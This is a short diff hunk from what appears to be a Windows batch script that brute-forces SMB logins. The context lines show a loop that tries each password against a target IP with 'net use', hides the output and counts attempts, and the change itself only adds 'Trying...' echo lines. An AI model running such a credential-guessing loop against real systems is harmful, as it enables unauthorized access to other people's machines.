@@ -36,6 +36,10 @@ exit
 
 
 :attempt
+echo.
+echo.
+echo Trying...
+echo.
 net use \\%ip% /user:%user% %pass% >nul 2>&1
 echo [ATTEMPT %count%] [%pass%]
 set /a count=%count%+1
